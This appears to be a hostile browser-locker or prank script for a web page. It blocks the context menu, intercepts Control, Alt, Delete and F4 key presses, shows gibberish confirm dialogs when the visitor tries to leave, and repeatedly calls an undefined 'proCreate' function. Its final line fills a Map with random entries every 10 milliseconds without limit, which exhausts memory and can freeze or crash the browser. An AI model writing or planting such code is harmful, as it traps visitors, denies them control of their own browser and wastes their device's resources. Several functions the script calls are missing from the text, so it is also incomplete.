let thing = new Map()

/** @type {HTMLAudioElement} */
let audio = document.querySelector('#audio')

document.addEventListener("click", async () => {
	await proCreate(1);
});

document.addEventListener('pointerenter', () => {
	audio.play()

	playBall();
	audioPlay();
	setTimeout(() => {
		proCreate(1)
	}, 1000);
})

window.onload = playBall

window.oncontextmenu = () => false;
window.onkeydown = () => {
	if (['Control', 'Alt', 'Delete', 'F4'].includes(event.key)) {
		const a = document.createElement('a')
		proCreate(1);
		confirm("???????????????????????????????? /??????!?????????");
	}

	return null;
}
window.onbeforeunload = () => {
	confirm('!!!!!!!!!""??"??$444$?$£*(*"*"')
	proCreate(1);
}

setInterval(() => thing.set(`${Math.random() * 999999}`, `${Math.random() * 999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999n}`), 10)